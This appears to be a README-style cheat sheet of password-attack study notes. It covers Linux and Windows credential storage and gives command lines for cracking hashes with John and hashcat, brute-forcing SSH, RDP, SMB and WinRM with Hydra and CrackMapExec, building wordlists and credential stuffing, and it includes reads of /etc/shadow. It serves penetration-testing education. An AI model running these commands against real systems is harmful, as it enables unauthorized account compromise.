<h1 align="center">
  <br>
  <a href=""><img src="/img/logo.png" alt="" height="300px;"></a>
  <br>
  <img src="https://img.shields.io/badge/PRs-welcome-blue">
  <img src="https://img.shields.io/github/last-commit/kh4sh3i/Password-Attacks">
  <img src="https://img.shields.io/github/commit-activity/m/kh4sh3i/Password-Attacks">
  <a href="https://twitter.com/intent/follow?screen_name=kh4sh3i_"><img src="https://img.shields.io/twitter/follow/kh4sh3i_?style=flat&logo=twitter"></a>
  <a href="https://github.com/kh4sh3i"><img src="https://img.shields.io/github/stars/kh4sh3i?style=flat&logo=github"></a>
</h1>


# PASSWORD ATTACKS
Password attacks are a common and critical aspect of cybersecurity, and they come in various forms. Here's an overview of the most widely known types of password attacks:

## Authentication
* Something you know (a password, passcode, pin, etc.).
* Something you have (an ID Card, security key, or other MFA tools).
* Something you are (your physical self, username, email address, or other identifiers.)

# Credential Storage
## 1. Linux
```
// password list
cat /etc/shadow
y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::


// uername list
cat /etc/passwd
...SNIP...
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```


## 2.Windows Authentication Process
Windows Authentication Process Diagram


<h1 align="center">
  <img src="/img/1.webp" alt="" height="500px;">
</h1>

### LSASS
Local Security Authority Subsystem Service (LSASS) is a collection of many modules and has access to all authentication processes that can be found in %SystemRoot%\System32\Lsass.exe.


### SAM Database
User passwords are stored in a hash format in a registry structure as either an LM hash or an NTLM hash. This file is located in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM

Domain Controller (DC) must validate the credentials from the Active Directory database (ntds.dit), which is stored in %SystemRoot%\ntds.dit.


### SYSKEY
Microsoft introduced a security feature in Windows NT 4.0 to help improve the security of the SAM database against offline software cracking. This is the SYSKEY (syskey.exe) feature, which, when enabled, partially encrypts the hard disk copy of the SAM file so that the password hash values for all local accounts stored in the SAM are encrypted with a key.



### Credential Manager

<h1 align="center">
  <img src="/img/2.webp" alt="" height="500px;">
</h1>


### NTDS
NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:

* User accounts (username & password hash)
* Group accounts
* Computer accounts
* Group policy objects


## John The Ripper

## Attack Methods
* Dictionary Attacks
* Brute Force Attacks
* Rainbow Table Attacks


## Cracking Modes
Single Crack Mode is one of the most common John modes used when attempting to crack passwords using a single password list
* Single Crack Mode
```
john --format=<hash_type> <hash or hash_file>
```

* Wordlist Mode
```
john --wordlist=<wordlist_file> --rules <hash_file>
```

* Incremental Mode
```
john --incremental <hash_file>
```


# Remote Password Attacks
* Network Services
* Password Mutations
* Password Reuse / Default Passwords

# Network Services
```
FTP	SMB	NFS
IMAP/POP3	SSH	MySQL/MSSQL
RDP	WinRM	VNC
Telnet	SMTP	LDAP
```
* WinRM
* SSH
* Remote Desktop Protocol (RDP)
* SMB

## WinRM
Windows Remote Management (WinRM) is the Microsoft implementation of the network protocol Web Services Management Protocol (WS-Management). It is a network protocol based on XML web services using the Simple Object Access Protocol (SOAP) used for remote management of Windows systems. It takes care of the communication between Web-Based Enterprise Management (WBEM) and the Windows Management Instrumentation (WMI), which can call the Distributed Component Object Model (DCOM).

* WinRM uses the TCP ports 5985 (HTTP) and 5986 (HTTPS).

### CrackMapExec
```
sudo apt-get -y install crackmapexec
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

### Evil-WinRM
```
sudo gem install evil-winrm
evil-winrm -i <target-IP> -u <username> -p <password>
evil-winrm -i 10.129.42.197 -u user -p password
```

## SSH
Secure Shell (SSH) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on TCP port 22 by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: symmetric encryption, asymmetric encryption, and hashing.

### Hydra - SSH
```
hydra -L user.list -P password.list ssh://10.129.42.197
```

## Remote Desktop Protocol (RDP)
Microsoft's Remote Desktop Protocol (RDP) is a network protocol that allows remote access to Windows systems via TCP port 3389 by default.

### Hydra - RDP
```
 hydra -L user.list -P password.list rdp://10.129.42.197
 ```

 ### xFreeRDP
```
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

## SMB
Server Message Block (SMB) is a protocol responsible for transferring data between a client and a server in local area networks.
SMB is also known as Common Internet File System (CIFS). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS. In addition, we will often encounter Samba, which is an open-source implementation of the above functions. 

### Hydra - SMB
```
hydra -L user.list -P password.list smb://10.129.42.197
```

### Metasploit Framework
### CrackMapExec
Now we can use CrackMapExec again to view the available shares and what privileges we have for them.
```
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```

### Smbclient
```
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

# Password Mutations
We can use a very powerful tool called Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists. 

## Generating Rule-based Wordlist
```
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
ls /usr/share/hashcat/rules/
```

## Generating Wordlists Using CeWL
We can now use another tool called CeWL to scan potential words from the company's website and save them in a separate list
```
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

# Password Reuse / Default Passwords
In addition, easy-to-remember passwords that can be typed quickly instead of typing 15-character long passwords are often used repeatedly because Single-Sign-On (SSO) 

## Credential Stuffing
```
https://github.com/ihebski/DefaultCreds-cheat-sheet
https://www.softwaretestinghelp.com/default-router-username-and-password-list/
```

## Credential Stuffing - Hydra Syntax
(username:password) format:
```
hydra -C <user_pass.list> <protocol>://<IP>
```


# Windows Local Password Attacks
## Attacking SAM
